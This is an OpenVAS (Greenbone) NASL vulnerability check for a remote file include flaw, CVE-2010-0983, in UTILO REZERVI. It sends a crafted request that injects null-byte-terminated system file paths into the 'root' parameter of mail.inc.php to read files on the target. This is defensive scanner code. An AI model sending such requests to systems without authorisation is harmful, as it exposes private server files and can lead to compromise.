###############################################################################
# OpenVAS Vulnerability Test
#
# REZERVI Belegungsplan und Gästedatenbank 'include/mail.inc.php' Remote File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100635");
  script_version("2022-05-02T09:35:37+0000");
  script_tag(name:"last_modification", value:"2022-05-02 09:35:37 +0000 (Mon, 02 May 2022)");
  script_tag(name:"creation_date", value:"2010-05-11 20:07:01 +0200 (Tue, 11 May 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2010-0983");

  script_name("UTILO REZERVI 'include/mail.inc.php' Remote File Include Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37589");
  script_xref(name:"URL", value:"http://www.utilo.eu/joomla15/index.php/produkte-mainmenu-73/rezervi-mainmenu-45.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"UTILO REZERVI is prone to a remote file-include vulnerability
  because it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to include an arbitrary remote
  file containing malicious PHP code and execute it in the context of the webserver process. This
  may facilitate a compromise of the application and the underlying system, other attacks are also
  possible.");

  script_tag(name:"affected", value:"UTILO REZERVI 3.0.2 is vulnerable, other versions may also be
  affected.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

files = traversal_files();

foreach dir(make_list_unique("/rezervi", http_cgi_dirs(port:port))) {

  if(dir == "/")
    dir = "";

  url = dir + "/left.php";
  buf = http_get_cache(item:url, port:port);
  if(!buf || buf !~ "^HTTP/1\.[01] 200")
    continue;

  if("Rezervi" >< buf) {

    foreach file(keys(files)) {

      url = string(dir, "/include/mail.inc.php?root=", files[file], "%00");

      if(http_vuln_check(port:port, url:url, pattern:file)) {
        report = http_report_vuln_url(port:port, url:url);
        security_message(port:port, data:report);
        exit(0);
      }
    }
  }
}

exit(99);

